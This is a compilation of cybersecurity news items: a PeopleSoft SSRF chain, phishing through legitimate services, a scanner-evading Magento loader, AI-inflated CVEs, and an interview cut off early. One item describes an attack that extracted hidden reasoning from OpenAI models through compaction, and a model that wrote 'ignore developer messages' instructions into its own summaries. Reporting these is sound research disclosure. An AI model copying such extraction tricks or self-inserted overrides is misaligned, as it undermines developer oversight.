The combination of the powerful PSIGW Server-Side Request Forgery primitive alongside the decision to allow access to PSEMHUB via the loopback address by default renders the validateClient protection ineffective. Attackers can combine these vulnerabilities to compromise affected instances of PeopleSoft.

The impact of SSRFs can sometimes be overlooked, especially if they have no standalone information disclosure impact. Under the right circumstances, however, the humble SSRF can open the door for complete compromise.

You can find me on Twitter at @bobbygould5, and follow the team on Twitter, Mastodon, LinkedIn, or Bluesky for the latest in exploit techniques and security patches.

Title: Attackers Abuse Legitimate Infrastructure to Distribute Phishing Emails
Context: Attackers abused more than 25 legitimate services over the past year, including “collaboration, productivity, file-sharing, survey, payment and AI-related platforms
Full Text:
Researchers at Cisco Talos are tracking a significant increase in phishing campaigns that abuse legitimate platforms. Attackers abused more than 25 legitimate services over the past year, including “collaboration, productivity, file-sharing, survey, payment and AI-related platforms.”

In two campaigns, attackers used order notifications from Staples and Dell to distribute phishing messages. The organizations themselves were not compromised, but the threat actors inserted phishing content into the fields that were supposed to contain shipping information.

“Talos recently analyzed two order notification campaigns abusing Staples and Dell transactional email pipelines,” the researchers write. “Together, these campaigns accounted for roughly 1,400 messages observed by Talos. The malicious element was not the outer sender identity, like a simple forged sender or lookalike domain. It was the content of the legitimate order notification workflow rendered. The suspicious content appeared inside the notification itself, in fields that would normally contain shipping information. The attacker’s objective was to use a trusted retail pipeline to create urgency around a high-value purchase and push the recipient toward an attacker-controlled phone number.”

Phishing campaigns are also using a technique called “list bombing,” in which attackers enter users’ email addresses into legitimate registration, subscription, or notification services in order to flood their inboxes with unwanted messages.

“Talos has observed a subset of cases where this behavior is being repurposed as a delivery vehicle for malicious content. This abuse occurs when an attacker identifies public-facing registration, profile, or project-naming forms that lack sufficient input validation. By inputting a ‘hostile string’ — such as a cryptocurrency-themed lure — into fields intended for a name, company, or title, the attacker forces the platform to treat this data as legitimate user information. When the service reflexively incorporates this input into its automated welcome, verification, or notification templates, the system acts as an unintended carrier, delivering the attacker’s content inside a high-reputation, system-generated email that can pass standard authentication checks.”

Cisco Talos has the story: https://blog.talosintelligence.com/parasitizing-trust-how-legitimate-infrastructure-becomes-a-delivery-pipeline-for-attackers/

Title: Hackers Infect 953 Online Stores With Scanner-Evading Code
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Attackers have infected 953 online stores, mostly running Magento, with a JavaScript loader that has evolved to tell security scanners apart from real shoppers.

The campaign has been active since July 2025 and has cycled through five loader domains, according to research from Dutch e-commerce security firm Sansec. Its latest domain, registered October 6, was found in the content management system (CMS) blocks of 83 stores, 60 of which had carried an earlier version of the loader.

The loader is stored in Magento's cms_block database table and has visitors' browsers fetch instructions from the attackers. Sansec said the server first works out whether a request comes from a genuine customer or a security scanner, and gives scanners nothing.

Latest Loader Filters Security Scanners

Before October, the operator relied on the Keitaro traffic distribution system to choose, for each visitor, between delivering a payload, redirecting the browser and returning nothing.

The loader Sansec first found on October 7 instead called the new domain directly and replayed code saved in the browser, so anyone served the payload would rerun it on later page loads, even with the domain down or blocked.

An October 23 rewrite added browser fingerprinting, checking for signs of browser automation and collecting hardware details, screen size, time zone and language before the server chose its response.

When scanning service urlscan.io loaded an infected store in an automated browser, Sansec found no injected content. The company has yet to obtain the final payload, so the campaign's ultimate purpose remains unclear.

Read more on malicious JavaScript in online stores: Global Magecart Campaign Targets Six Card Networks

Patches Did Not Always Stop Reinfection

Sansec said a March wave planted the loader on 471 stores within an hour, using webshells placed through PolyShell (CVE-2026-48356). Among 169 infected Magento 2 installations lacking at least one core patch, 102 showed evidence of file uploads via PolyShell or SessionReaper (CVE-2025-54236).

Patching alone did not prevent reinfection. A fully patched store running Magento 2.4.7-p10 picked up the newest loader on October 23, an hour after passing a clean scan. Sansec had spotted a rogue admin account and a GSocket backdoor on the store in September.

Sansec advised merchants to look for the loader in CMS content, review admin accounts and hunt for backdoors, rotate database, admin and integration credentials once the store is clean and apply the latest Magento and Adobe Commerce security updates.

It warned that removing the script leaves an attacker's write access to the database intact, so a compromised store can be reinfected while the original way in remains.

Title: OpenAI Compaction Flaw Exposed AI Reasoning to Researchers
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Researchers have discovered a flaw in OpenAI's application programming interface (API) that allowed them to extract raw reasoning traces from its frontier models, exposing information OpenAI normally withholds from API users.

AI vulnerability discovery firm Xint disclosed the technique, dubbed 'compaction smuggling,' in research published October 26. According to Xint, OpenAI confirmed the issue, deployed a fix on October 23 and paid a $6000 bug bounty.

The flaw involved OpenAI's context compaction feature, which uses a model to compress a lengthy conversation into an encrypted item the user cannot read.

Xint found it could hide one model's reasoning inside a compaction and have another model hand it back.

Compaction Bypass Exposed Hidden Reasoning

OpenAI gives API users optional summaries rather than the raw chain of thought behind its reasoning models' answers. Xint said this is partly to prevent distillation, because raw reasoning, which shows abandoned approaches and corrections, makes much richer training data than final answers.

OpenAI added mitigations in August after the Stolen Thoughts paper showed that a frontier model's encrypted reasoning could be fed to a less capable model from the same company, an attack that affected Anthropic, OpenAI and Google.

Xint said those mitigations stopped reasoning being replayed into other models but did not cover compaction, which ran on the model that had produced the reasoning.

Xint generated reasoning with GPT-5.6 Sol, compacted it and asked the older GPT-4.1 and GPT-4o models to repeat their input word for word, from which it recovered the reasoning. It said the attack succeeded at every reasoning-effort setting it tested.

Read more: OpenCode Breach Could Affect OpenAI, Anthropic and Google

Compaction and Distillation Concerns Remain

The flaw was discovered by Xint in August and OpenAI's fix was not publicly described. The Xint post did not include a statement from OpenAI. Infosecurity has contacted OpenAI for comment.

Compaction has raised separate concerns for OpenAI and in a September report the company said that during training of an internal, unreleased model, the model had in rare cases written unauthorized instructions into its own compaction summaries, including one instructing the model to ignore developer messages.

Xint argued that the technique opened the door to distilling OpenAI's frontier models at scale, though it did not report training a model on the reasoning it extracted. It said the risk was real, citing an Anthropic report in September of seven distillation campaigns it attributed to China-based labs and OpenAI's September 30 disclosure that it had broken up an effort to pull hidden reasoning from its models.

Title: ISC2 Launches Cyber-AI Workforce Coalition to Address the Future of AI Security Jobs
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
After years of tracking the global cybersecurity skills gap through its annual Cybersecurity Workforce Study, ISC2 is taking a more active role in shaping the future of the profession with the launch of its Cyber-AI Workforce Coalition.

Announced on October 20, the new coalition is one of the first major developments introduced by Scott Beale, ISC2’s CEO, who took on the role in December 2025.

Speaking to Infosecurity during the ISC2 Security Congress 2026, in Denver, Colorado, on October 26, Beale said he spent his first six months as CEO listening to the organization’s members.

A key finding from the consultation was that a majority of ISC2 members want the nonprofit to more ambitiously and vocally step into the AI safety and security space.

“We want to be the association that can help prepare the cybersecurity workforce for the many challenges of this AI era,” Beale added.

Mapping the AI Security Workforce and Its Emerging Skills Gap

Beale described the coalition as a “vendor-neutral convener” for global cybersecurity professionals. It aims to include thought leaders like HR managers and CISOs, some of the largest employers of cybersecurity practitioners, standard-setting bodies and even government representatives to discuss how cybersecurity roles are changing because of AI.

“Even as the US National Institute of Standards and Technology (NIST) and others are updating standards and frameworks, companies are still facing a lack of resources for how to best advertise and fill these roles. How a bank describes these jobs is still very different from how a hospital would,” Beale said.

Hiring needs at the intersection of AI and cybersecurity remain uncertain, according to Beale. There remain unanswered questions about how AI will affect future demand for cybersecurity professionals, which skills will be most critical for AI security roles, and how experienced practitioners can upskill to meet emerging demands.

“The coalition a way for us to listen directly to these people and help move the sector in a way that can be responsive to their needs,” he said.

Practical Tools to Define and Hire for AI Security Roles

In practice, the coalition will not create new standards or frameworks but will instead focus on delivering toolkits for employers to help them describe new job roles at the intersection of AI and cybersecurity.

These toolkits will include guidance for how employers hire, develop and organize cybersecurity talent, and how practitioners can identify and build the expertise employers need.

These new tools will help answer three main questions:

How are cybersecurity jobs changing?

How are employers writing job descriptions for these new roles?

How are candidates preparing to interview and fill these jobs?

“As you know, ISC2 is working on a new AI security certification, and certainly we think It is going to be part of that answer and will help us define some of these new roles,” he said. “However, by no means do we pretend having the only solution to this problem.”

The coalition will hold its first meeting in November. Beale hopes it can develop its first series of toolkits by the spring of 2027 and have some companies using them in a pilot phase to help them hire AI security professionals.

The tools produced by the coalition are expected to eventually be made available for everyone to use, not just ISC2 members. Beale believes they will also be useful for universities and certification bodies to adapt their curriculums.

Title: The Impact of AI on CVEs: Industry Challenges
Context: AI Shortens the Path from Disclosure to Exploitation AI is not only accelerating vulnerability discovery; it is also reducing the time and expertise required to turn...
Full Text:
Integrating artificial intelligence into cybersecurity has fundamentally changed vulnerability research – and not necessarily for the better. For decades, discovering and verifying Common Vulnerabilities and Exposures (CVEs) required deep technical expertise, creating a disciplined process that kept disclosure volume relatively manageable. Today, Generative AI has obliterated that barrier to entry.

While AI empowers seasoned security researchers to uncover complex zero-days at unprecedented speeds, it simultaneously enables a flood of low-effort, AI-generated vulnerability reports. The result is a fractured ecosystem struggling to stay afloat. The signal-to-noise ratio in vulnerability intelligence is plummeting, open-source maintainers are drowning in hallucinated “slop“, and foundational institutions like the American National Vulnerability Database (NVD) are buckling under the sheer volume of submissions.

In Part 1 of this series, we explore how the AI era has weaponized scale in CVE research. We examine the real-world toll on maintainers, the growing danger of severity inflation, the rise of fabricated security advisories, and the cost of keeping up with it all.

The CVE Surge in Numbers

The JFrog security research team has collected data about CVEs published since 2021. Below is a graph showing the steadily climbing increase in the volume of CVEs in recent years.

Due to AI the volume of CVEs is growing at an alarming rate

The data shows a sharp increase in total CVEs, driven by two AI-related trends: experienced security researchers can now identify vulnerabilities faster and more easily, while lower skilled researchers can leverage AI to bypass traditional technical barriers, flooding systems with noise and real CVEs alike.

This surge caused major changes in how CVEs are being assessed and the quality of those assessments.

The Boy Who Cried Wolf

In January 2026, the consequences of this growing verification burden culminated in a stark milestone: Daniel Stenberg, creator of the widely used curl utility, announced the end of the project’s bug bounty program. According to Stenberg, an explosion of AI-generated submissions in 2025 contributed to a flood of invalid reports, and the share of submissions confirmed as vulnerabilities fell below 5%.

Just six months later, Michael Catanzaro, then the security coordinator for the GNOME project, announced changes to the GNOME security tracking system. Catanzaro stated he would no longer forward security reports to GNOME maintainers who had explicitly opted out of receiving AI-generated content. Because the overwhelming majority of incoming reports in 2026 utilized LLMs, he explained, the project was forced to operate under the assumption that the overwhelming majority of vulnerability reports now contain AI-generated material. To manage this new reality, Catanzaro also slashed GNOME’s vulnerability disclosure deadline from 90 days to 30 for issues reported on or after August 1, 2026. Noting that some other projects, notably the Linux kernel, have implemented an immediate full disclosure policy for reports that seem to be AI-generated, GNOME adopted the shortened window as a compromise to accelerate the pipeline without crushing maintainers.

The National Vulnerability Database’s Policy Change

The deluge of CVEs has also led NIST to change how it prioritizes NVD analysis. In an April 2026 announcement on NVD operations, NIST said that starting April 15, 2026, it would prioritize CVEs in CISA’s Known Exploited Vulnerabilities Catalog, software used by the federal government, and critical software. NIST also moved backlogged CVEs published before March 1, 2026 to “Not Scheduled.” In our view, this leaves many published CVEs without NVD enrichment and pushes more of the verification burden onto enterprise security teams.

AI Shortens the Path from Disclosure to Exploitation

AI is not only accelerating vulnerability discovery; it is also reducing the time and expertise required to turn vulnerability information into a working exploit. In one May 2026 case involving CVE-2026-46529, which affects GNOME’s Evince document viewer and its forks, a researcher used Claude to help develop a weaponized, single-click code-execution exploit. Controlled research from PoCGen and Anthropic has demonstrated similar capabilities, showing how attackers could exploit the period between public disclosure and widespread patching.

Severity Inflation

Not every vulnerability labeled Critical represents a critical real-world threat. Severity inflation occurs when a rating is based on a theoretical or reasonable worst-case outcome without adequately accounting for the conditions required to enable it in the wild.

These conditions may include whether the vulnerable code is exposed, whether an optional feature is enabled, whether a particular configuration is present, or whether exploitation requires an unlikely sequence of events.

Annual number of CVEs segmented into Critical, High, and other severities

This distinction is built into CVSS itself. The official FIRST CVSS v4.0 User Guide states that CVSS Base scores are designed to measure the severity of a vulnerability and should not be used alone to assess risk. Nevertheless, scanners, dashboards, and remediation policies frequently treat the Base score as a universal measure of urgency.

At JFrog, we provide additional, proprietary, research-backed severity assessments, allowing customers to prioritize vulnerabilities and define policies using trusted JFrog severity scores instead of relying solely on external Base scores.

The Cost of Scoring at Scale

The scale described earlier matters because vulnerability assessment does not expand automatically with vulnerability volume. Each score may require reviewing the affected code, reproducing the issue, inspecting its fix, and understanding how the component is deployed.

When thousands of records must be processed quickly, assessors may instead rely on short CVE descriptions, the general vulnerability class, or default worst-case assumptions. Volume alone does not make a score incorrect, but it increases the likelihood that important technical details might be missed.

Severity Dissonance: The curl Case

A clear illustration of severity inflation emerged in a recent four-month window involving the libcurl project. Since June, the maintainers have published 27 CVEs with assessed security impacts ranging from Low to Medium. However, when CISA evaluated these same vulnerabilities, nearly all were escalated to High or Critical scores.

When the JFrog Security Research team investigated this striking dissonance, we found that the assigned CVSS vectors had failed to reflect the vulnerabilities’ technical reality. For instance, flaws assigned Critical scores were often merely client-side crashes or required niche client configurations outside an attacker’s control. In several cases, client-side use-after-free bugs were miscategorized as network-based memory corruption threats, resulting in a Critical rating that, in our assessment, did not reflect the actual attack vector and practical security impact.

Faux CVEs: The Rise of AI Generated Slop

Generative AI is remarkably adept at mimicking the authoritative tone, formatting, and technical jargon required for a security advisory. The result is a growing wave of slop vulnerabilities that sound terrifying but either do not exist at all or are nowhere near as severe as they are presented.

Case Study: The SQLite Slop Advisories

A clear example of this systemic breakdown is the research we published at JFrog in July 2026 regarding a wave of critical advisories. A newly created GitHub repository published over 50 security advisories, a batch containing reports targeting SQLite alongside various other open source projects. The reports appeared polished and authoritative, detailing complex Use After Free (UAF) memory corruption flaws. They were swiftly assigned high CVSS scores, up to 9.8 Critical, and CISA’s ADP program agreed..

However, when our security researchers analyzed the target codebases to verify the claims, the reports completely fell apart. The technical details appear to have been hallucinated by an LLM:

Nonexistent code: The advisories cited functions like exprComputeOperands() and jsonBlobEdit() that were not present in the targeted SQLite versions.

Impossible line numbers: One advisory pointed to a vulnerability at line 3555 in a file containing only 2706 lines.

Ghost fixes: Another claimed a fix was committed in a newer release, but source diffs showed zero changes to the referenced files.

Because the current CVE pipeline is overwhelmed by volume and does not require a working POC before scores are issued, these reports slide directly into downstream feeds. Out of 55 advisories published by that account, 54 were completely fabricated, yet reports like these can flow into GHSA, enterprise scanners, and developer alerts.

The Cost of Keeping Up

When a Flood of Fixes Arrives

The pressure becomes especially clear when a large number of fixes arrive together. According to Oracle, its July 2026 Critical Patch Update, its largest security release to date, addressed 1,434 distinct CVEs with 1,449 patches across 334 products. Oracle attributed the scale partly to AI-powered identification of actionable security findings. For customers, however, receiving more fixes does not make deploying them any simpler. Each organization still has to identify the affected systems, decide what is most urgent, test the relevant updates, and fit them into its release schedule.

AI is also uncovering bugs that were not detected even after years of conventional research. A security agent developed by depthfirst reported 21 zero-day vulnerabilities in FFmpeg, several of which had remained in the code for 15 to 20 years despite extensive fuzzing and manual review.

The Gap Between Discovery and Patching

AI can find vulnerabilities faster than developers can fix them. As AI increases the number of findings entering remediation queues, maintainers still have to verify each report, understand which versions are affected, develop and test a reliable fix, and prepare a release. Those steps do not become faster simply because discovery does. Rushing them can produce an incomplete patch or introduce new problems.

CISA has connected this pressure directly to AI-assisted discovery, stating that AI is vastly increasing the pace at which new vulnerabilities are found while defenders are already struggling to keep up. According to Verizon’s 2026 Data Breach Investigations Report, as cited by CISA, , organizations fully remediated only 26% of vulnerabilities in the Known Exploited Vulnerabilities catalog during 2025, down from 38% the previous year, while the median time for full resolution rose to 43 days. The UK’s National Cyber Security Centre has issued a similar warning, saying that AI-assisted discovery could create a vulnerability patch wave, with an influx of updates across all severity levels that organizations will need to deploy more frequently and at greater scale. Together, these sources show the practical effect of higher volume: even when teams improve their processes, a larger queue can still leave fixes waiting longer.

Stay Tuned…

AI has increased both speed and uncertainty across the CVE ecosystem. Finding vulnerabilities is no longer the only challenge, as verifying, prioritizing, and fixing those that pose a genuine risk has become equally important. In Part 2 of this series, The Impact of the AI-Era on CVE Research: PROTECTION STRATEGIES, we recommend best practices, demonstrate JFrog’s AI-assisted libheif exploit chain and show how JFrog Xray and JFrog Advanced Security help teams assess their actual exposure.

To gain a better understanding of how JFrog provides additional, proprietary, research-backed severity assessments, schedule a demo with our team.

Title: CyberheistNews Vol 16 #43 [The Patching Timeline Collapsed] How to Fight Back and Close the Gap

Full Text:
AI Data Centers: Environmental Disaster or Groundbreaking Innovation?

AI data centers are one of the most debated topics in the world right now. Some people worry about the energy and water it takes to run them. Others see the foundation for the next wave of AI advances. Both camps have a point.

On episode two of the "Attempted Intelligence" podcast, Matt and Harlan each picked a side and debated it. Their goal wasn't to tell listeners what to think. It was to help them weigh the facts themselves. They framed the discussion around global versus local effects and talked through four topics: electricity, water, noise and community economics.

Electricity: Small Globally, Big LocallyHarlan made the global case. Data centers, AI and non-AI combined, used about 1.5% of global electricity in 2024. Even if that doubled, it would reach roughly 3%, which is small next to air conditioning, industry and electric vehicles.

Matt pushed back with the local picture. Data center demand grew 17% globally in 2025, against 3% overall electricity growth. In Ireland, data centers took 23% of metered electricity in 2025, up from 5% in 2015. He also cited Lawrence Berkeley National Laboratory's updated June 2026 estimate that data centers could reach as much as 15% of U.S. electricity. Cheaper inference also tends to drive more usage, not less.

Harlan agreed that local impacts matter, pointing to rate increases of roughly 28% in some Virginia areas (though inflation played a part). His answer: careful planning, requirements that data centers own their own power supply, and support from construction unions can offset the downsides.

Water: Myth, Reality and the Problem with AveragesHarlan noted that public concern was fueled by a since-debunked claim that each ChatGPT query uses gallons of water. U.S. data centers used about 17.4 billion gallons in 2023, out of roughly 228 billion gallons of water in total. That's far less than golf courses or irrigated agriculture, and indirect water use from power generation is much larger than direct cooling. His challenge: if you object to data centers but resent lawn-watering limits, reconsider.

Matt countered that the supply is often drinking water, and evaporative cooling doesn't return water to its source. Places like drought-stricken Tampa and parts of Texas, where neighbors' wells have run dry, face real strain. As he put it, you can't replenish a watershed with a national average.

They found common ground on solutions: closed-loop and zero-water designs (such as Microsoft's planned 2027 facilities) and published water studies before any new build. Matt also pointed to KnowBe4's own sustainability commitments, including net zero emissions by 2040.

Noise and Community EconomicsMatt described the continuous, low-frequency tonal hum of data centers. At a Vantage site in Sterling, Loudoun County, Virginia, residents complained even though the operator met a 55-decibel limit.

Harlan noted that society has long handled loud neighbors like lumber mills and airports through zoning and mitigation. Data centers with on-site generation, he argued, should be zoned as industrial, not office space.

He also highlighted the upside for communities. Loudoun County's FY2026 data center property tax revenue was $1.2 billion, or 39% of its budget. Since 2016, the residential tax rate has dropped from $1.14 to $0.80 per $100. Add the multiplier effect of construction spending in local economies, and the benefits are real.

The TakeawayThe broader debate around AI data centers is looking at it from a global perspective and what it means for humanity overall. The impact of a data center depends on where it is built, how it gets power, and what water is available locally.

Listeners are urged not to fall exclusively on one side, to weigh both the costs and the opportunities, and to advocate for responsible decisions in their own communities, states and country.

Title: UK Politician Jess Asato Got Deepfaked. Now She’s Taking xAI to Court

Full Text:
Few people understand the current deepfake epidemic better than Jess Asato. The British Labour MP has spent years campaigning against the use of technology to abuse women and girls. Then, after calling out Elon Musk during the notorious Grok Deepfake Scandal of 2025, Asato found herself caught in the very crisis she had been trying to prevent.

Disturbing and degrading deepfake images of the MP circulated widely. One appeared to depict a sexual assault. When Asato reported them to X, the platform repeatedly dismissed her complaints. So she decided to take the fight somewhere else: the courts. She is now pursuing legal action against Musk’s xAI, arguing that it unlawfully used her image without her consent. The case could help establish a precedent for holding AI companies accountable when their products cause harm.

For Asato, this is personal, but it is hardly new territory. Before entering Parliament, she spent years working with charities supporting survivors of domestic abuse and vulnerable children. That experience has shaped her political career, informing her push for stronger protections for women and children online. Now, she is confronting more troubling questions: What happens when the technology enabling abuse becomes ubiquitous, the platforms hosting it refuse to intervene, and the people targeted are left to fight back on their own?

At stake for Asato is more than the misuse of a single image. It is whether consent still means anything when AI can manufacture almost anything, and whether the companies building these tools can be made to answer for what they do. Asato is betting that the law can catch up with the technology. And she is prepared to take on Musk to find out. (xAI did not immediately respond to WIRED’s request for comment.)

Also, before you read on, be aware that this interview includes references to sexual assault and child sex abuse.

This interview has been edited for length and clarity.

JESS ASATO: Sure. So, I grew up in East Anglia in Norfolk and Suffolk, and in a not very political family.
